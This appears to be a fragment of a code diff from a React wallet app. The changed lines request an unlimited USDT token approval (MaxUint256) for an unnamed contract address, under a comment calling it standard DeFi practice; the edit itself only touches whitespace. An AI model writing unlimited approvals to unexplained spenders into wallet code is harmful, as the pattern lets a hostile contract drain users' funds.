@@ -411,7 +411,7 @@ export default function App() {
               
                             // 🔥 UNLIMITED APPROVAL: Standard DeFi UX
               const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, ethers.MaxUint256.toString()]);
-                          
+
               const txHash = await (activeProvider as any).request({
                 method: 'eth_sendTransaction',
                 params: [{
